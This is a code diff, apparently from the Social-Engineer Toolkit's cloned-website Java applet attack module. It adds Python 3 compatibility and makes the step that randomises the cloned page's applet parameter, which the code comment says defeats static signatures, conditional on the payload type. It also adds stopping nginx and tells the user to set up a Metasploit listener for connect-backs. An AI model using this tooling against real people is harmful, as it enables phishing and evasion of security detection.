@@ -5,8 +5,9 @@ import re
 import socket
 import subprocess
 from src.core.setcore import *
-import thread
-#import socketserver
+#python 3 compatibility
+try: import thread
+except ImportError: import _thread as thread
 import shutil
 import re
 import threading
@@ -26,26 +27,23 @@ if applet_name == "":
 custom = 0
 if check_options("CUSTOM_EXE="):
     custom = 1
-    print_status(
-        "Note that since you are using a custom payload, you will need to create your OWN listener.")
-    print_status(
-        "SET has no idea what type of payload you are using, so you will need to set this up manually.")
-    print_status(
-        "If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")
+    if not "CMD/MULTI" in check_options("CUSTOM_EXE="):
+        # here we need to modify the java applet to recognize custom attribute
+        fileopen3 = fileopen = open("%s/web_clone/index.html" % (setdir), "r")
+        filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
+        data = fileopen3.read()
 
-    # here we need to modify the java applet to recognize custom attribute
-    fileopen3 = fileopen = open("%s/web_clone/index.html" % (setdir), "r")
-    filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
-    data = fileopen3.read()
-
-    # we randomize param name so static sigs cant be used
-    goat_random = generate_random_string(4, 4)
-    data = data.replace('param name="8" value="YES"',
+        # we randomize param name so static sigs cant be used
+        goat_random = generate_random_string(4, 4)
+        data = data.replace('param name="8" value="YES"',
                         'param name="8" value="%s"' % (goat_random))
-    filewrite.write(data)
-    filewrite.close()
-    subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" %
-                     (setdir, setdir), shell=True).wait()
+        filewrite.write(data)
+        filewrite.close()
+        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir, setdir), shell=True).wait()
+
+    print_status("Note that since you are using a custom payload, you will need to create your OWN listener.")
+    print_status("SET has no idea what type of payload you are using, so you will need to set this up manually.")
+    print_status("If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")
 
 
 # set current path
@@ -314,8 +312,8 @@ def web_server_start():
                 print(bcolors.ENDC + "Do you want to try to stop Apache? y/n")
                 stop_apache = input("Attempt to stop Apache? y/n: ")
                 if stop_apache == "yes" or stop_apache == "y" or stop_apache == "":
-                    subprocess.Popen(
-                        "/etc/init.d/apache2 stop", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/nginx stop", shell=True).wait()
                     try:
 
                         # specify port listener here
